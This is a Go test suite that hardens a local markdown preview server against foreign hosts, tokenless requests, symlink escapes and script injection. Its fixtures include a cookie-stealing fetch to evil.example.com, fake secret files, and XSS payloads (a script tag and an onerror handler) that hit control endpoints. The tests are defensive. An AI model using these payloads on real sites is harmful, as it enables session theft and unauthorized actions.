package main

import (
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
)

func raw(t *testing.T, s *server, method, url, host string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(method, url, nil)
	req.Host = host
	recorder := httptest.NewRecorder()
	s.routes().ServeHTTP(recorder, req)
	return recorder
}

func TestRejectsForeignHost(t *testing.T) {
	s := testServer(t, fixture(t), "")
	for _, url := range []string{"/", "/README.md", "/_tree", "/_events", "/_static/app.css"} {
		if code := raw(t, s, http.MethodGet, url, "mds.example.com").Code; code != http.StatusForbidden {
			t.Errorf("GET %s with a foreign Host = %d, want 403", url, code)
		}
	}
	if code := raw(t, s, http.MethodGet, "/", "localhost:8080").Code; code != http.StatusOK {
		t.Errorf("GET / on localhost = %d, want 200", code)
	}
	if code := raw(t, s, http.MethodGet, "/", "[::1]:8080").Code; code != http.StatusOK {
		t.Errorf("GET / on ipv6 loopback = %d, want 200", code)
	}
}

func TestStateChangingEndpointsNeedTheToken(t *testing.T) {
	dir := fixture(t)
	plan := writeFile(t, t.TempDir(), "plan.md", "# Plan\n")
	s := testServer(t, dir, "")
	s.shutdown = func() { t.Error("/_stop ran without a token") }
	s.launch = func(string) error { t.Error("/_edit ran without a token"); return nil }
	s.addRoot(plan, false)

	for _, url := range []string{
		"/_add?path=" + dir, "/_drop?root=_r1", "/_stop", "/_edit?path=README.md",
	} {
		if code := raw(t, s, http.MethodPost, url, "127.0.0.1:8080").Code; code != http.StatusForbidden {
			t.Errorf("POST %s without a token = %d, want 403", url, code)
		}
	}
	if len(s.roots) != 2 {
		t.Errorf("roots = %d, want an untokened /_add and /_drop to have changed nothing", len(s.roots))
	}
	req := httptest.NewRequest(http.MethodPost, "/_stop", nil)
	req.Host, req.Header = "127.0.0.1:8080", http.Header{tokenHeader: {"wrong-token"}}
	recorder := httptest.NewRecorder()
	s.routes().ServeHTTP(recorder, req)
	if recorder.Code != http.StatusForbidden {
		t.Errorf("POST /_stop with a wrong token = %d, want 403", recorder.Code)
	}
}

func TestServesOnlyMarkdownAndImages(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "README.md", "# Root\n")
	writeFile(t, dir, "logo.png", "\x89PNG fake\n")
	writeFile(t, dir, ".env", "AWS_SECRET_ACCESS_KEY=hunter2\n")
	writeFile(t, dir, "id_rsa", "-----BEGIN OPENSSH PRIVATE KEY-----\n")
	writeFile(t, dir, "steal.js", "fetch('//evil.example.com?c=' + document.cookie)\n")
	s := testServer(t, dir, "")

	if status, body := get(t, s, "/logo.png"); status != http.StatusOK || !strings.Contains(body, "PNG") {
		t.Errorf("GET /logo.png = %d, want the image markdown refers to", status)
	}
	for _, name := range []string{"/.env", "/id_rsa", "/steal.js", "/notes.txt"} {
		status, body := get(t, s, name)
		if status != http.StatusNotFound {
			t.Errorf("GET %s = %d, want 404: only markdown and images are served", name, status)
		}
		if strings.Contains(body, "hunter2") || strings.Contains(body, "PRIVATE KEY") {
			t.Errorf("GET %s leaked the file body", name)
		}
	}
}

func escapingLink(t *testing.T, dir, name, secret string) {
	t.Helper()
	rel, err := filepath.Rel(dir, secret)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(rel, filepath.Join(dir, name)); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
}

func TestSymlinkCannotEscapeTheRoot(t *testing.T) {
	outside := t.TempDir()
	secret := writeFile(t, outside, "id_rsa", "-----BEGIN OPENSSH PRIVATE KEY-----\n")
	dir := t.TempDir()
	writeFile(t, dir, "README.md", "# Root\n")
	escapingLink(t, dir, "notes.md", secret)
	escapingLink(t, dir, "logo.png", secret)
	escapingLink(t, dir, "escape", outside)
	s := testServer(t, dir, "")

	for _, url := range []string{"/notes.md", "/logo.png", "/escape/id_rsa"} {
		status, body := get(t, s, url)
		if strings.Contains(body, "PRIVATE KEY") {
			t.Errorf("GET %s followed a symlink out of the root", url)
		}
		if status != http.StatusNotFound {
			t.Errorf("GET %s = %d, want 404", url, status)
		}
	}
	writeFile(t, dir, "real.md", "# Real\n")
	if err := os.Symlink("real.md", filepath.Join(dir, "alias.md")); err != nil {
		t.Fatal(err)
	}
	if status, body := get(t, s, "/alias.md"); status != http.StatusOK || !strings.Contains(body, "Real") {
		t.Errorf("GET /alias.md = %d, want a symlink inside the root to still resolve", status)
	}
}

func TestSymlinkSwappedUnderTrafficCannotEscape(t *testing.T) {
	outside := t.TempDir()
	secret := writeFile(t, outside, "id_rsa", "-----BEGIN OPENSSH PRIVATE KEY-----\n")
	dir := t.TempDir()
	writeFile(t, dir, "real.md", "# Real\n")
	link := filepath.Join(dir, "notes.md")
	if err := os.Symlink("real.md", link); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	escape, err := filepath.Rel(dir, secret)
	if err != nil {
		t.Fatal(err)
	}
	s := testServer(t, dir, "")

	var leaked atomic.Int64
	var readers sync.WaitGroup
	stop := make(chan struct{})
	for range 4 {
		readers.Add(1)
		go func() {
			defer readers.Done()
			for {
				select {
				case <-stop:
					return
				default:
				}
				if _, body := get(t, s, "/notes.md"); strings.Contains(body, "PRIVATE KEY") {
					leaked.Add(1)
				}
			}
		}()
	}

	const rounds = 300
	served := 0
	for range rounds {
		relink(t, link, escape)
		if _, body := get(t, s, "/notes.md"); strings.Contains(body, "PRIVATE KEY") {
			leaked.Add(1)
		}
		relink(t, link, "real.md")
		if status, body := get(t, s, "/notes.md"); status == http.StatusOK && strings.Contains(body, "Real") {
			served++
		}
	}
	close(stop)
	readers.Wait()

	if n := leaked.Load(); n > 0 {
		t.Errorf("%d of %d reads followed the symlink out of the root", n, rounds)
	}
	if served != rounds {
		t.Errorf("the valid symlink was refused %d of %d times", rounds-served, rounds)
	}
}

func relink(t *testing.T, link, target string) {
	t.Helper()
	if err := os.Remove(link); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(target, link); err != nil {
		t.Fatal(err)
	}
}

func TestScriptsInMarkdownCannotRun(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "evil.md", "# Hi\n\n<script>fetch('/_add?path=/',{method:'POST'})</script>\n"+
		"<img src=x onerror=\"fetch('/_stop',{method:'POST'})\">\n<details><summary>ok</summary>body</details>\n")
	s := testServer(t, dir, "")
	recorder := request(t, s, http.MethodGet, "/evil.md")
	body, policy := recorder.Body.String(), recorder.Header().Get("Content-Security-Policy")

	scripts := ""
	for _, directive := range strings.Split(policy, "; ") {
		if source, ok := strings.CutPrefix(directive, "script-src "); ok {
			scripts = source
		}
	}
	nonce, ok := strings.CutPrefix(scripts, "'nonce-")
	if nonce, ok = strings.CutSuffix(nonce, "'"); !ok || nonce == "" {
		t.Fatalf("script-src = %q, want nothing but a nonce", scripts)
	}
	tags, nonced := strings.Count(body, "<script"), strings.Count(body, `<script nonce="`+nonce+`"`)
	if tags-nonced != 1 {
		t.Errorf("%d of %d script tags carry no nonce, want exactly the one that came from the markdown",
			tags-nonced, tags)
	}
	if !strings.Contains(body, "<script>fetch('/_add") || !strings.Contains(body, "onerror=") {
		t.Fatal("expected the hostile markup to reach the page unmodified")
	}
	if strings.Contains(body, `<script nonce="`+nonce+`">fetch(`) {
		t.Fatal("markdown-borne script picked up the nonce")
	}
	if !strings.Contains(body, "<details>") {
		t.Error("raw html should still render")
	}
}

func TestResponsesDenyCrossOriginReads(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "README.md", "# Root\n")
	writeFile(t, dir, "logo.png", "\x89PNG\n")
	s := testServer(t, dir, "")
	for _, url := range []string{"/README.md", "/logo.png", "/_static/app.js", "/_tree"} {
		recorder := request(t, s, http.MethodGet, url)
		if got := recorder.Header().Get("Cross-Origin-Resource-Policy"); got != "same-origin" {
			t.Errorf("GET %s CORP = %q, want same-origin", url, got)
		}
		if got := recorder.Header().Get("X-Content-Type-Options"); got != "nosniff" {
			t.Errorf("GET %s nosniff = %q, want nosniff", url, got)
		}
	}
	if got := request(t, s, http.MethodGet, "/_static/app.css").Header().Get("Content-Security-Policy"); got != "default-src 'none'; sandbox" {
		t.Errorf("static csp = %q, want the sandboxed baseline", got)
	}
}
